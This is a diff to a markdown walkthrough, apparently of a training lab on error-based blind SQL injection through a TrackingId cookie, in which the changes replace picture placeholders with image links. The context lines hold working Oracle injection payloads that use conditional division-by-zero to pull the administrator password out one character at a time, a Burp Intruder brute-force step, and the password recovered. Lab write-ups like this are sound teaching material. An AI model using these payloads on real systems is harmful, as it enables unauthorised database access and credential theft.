@@ -31,7 +31,8 @@ COOKIE'+and'1'='1
 Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
 ```
 
-**Pic 1**
+<img width="803" height="401" alt="1" src="https://github.com/user-attachments/assets/3ab9817a-ef80-423f-91d8-15f44e8d5708" />
+
 
 For MySQL, a conditional division-by-zero approach could be written as:
 
@@ -58,11 +59,13 @@ The URL-encoded cookie versions are:
 When the condition is true (`1=1`), the application responds with HTTP
 500.
 
-**Pic 2**
+<img width="803" height="431" alt="2" src="https://github.com/user-attachments/assets/91150a26-53f0-4409-bae8-b9bc10563456" />
+
 
 When the condition is false (`1=2`), the response is HTTP 200.
 
-**Pic 3**
+<img width="798" height="430" alt="3" src="https://github.com/user-attachments/assets/3f64336c-81e1-46db-bf33-bda23ed366fd" />
+
 
 This behavior can be used to test password characters. For the first
 character, the Oracle `SUBSTR` function is used:
@@ -75,17 +78,20 @@ COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE usernam
 9HCLCYU9VeK78knn'+AND+(SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))='a')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a;
 ```
 
-**Pic 4**
+<img width="802" height="461" alt="4" src="https://github.com/user-attachments/assets/4bf4119f-cd32-428a-855b-4bc392532d29" />
+
 
 The request can be sent to Intruder and different letters and numbers
 can be tested. The character that produces a 500 response is the correct
 character.
 
-**Pic 5**
+<img width="656" height="367" alt="5" src="https://github.com/user-attachments/assets/a6b7c7f5-0bd1-4856-b793-6593ee95d2ce" />
+
 
 The first character is `0`.
 
-**Pic 6**
+<img width="510" height="151" alt="6" src="https://github.com/user-attachments/assets/a78aca21-2069-4433-ae2a-0841ba62c185" />
+
 
 Continuing the same process reveals the complete password:
 `01k6j5tbrjpd9lpdk4zs`.
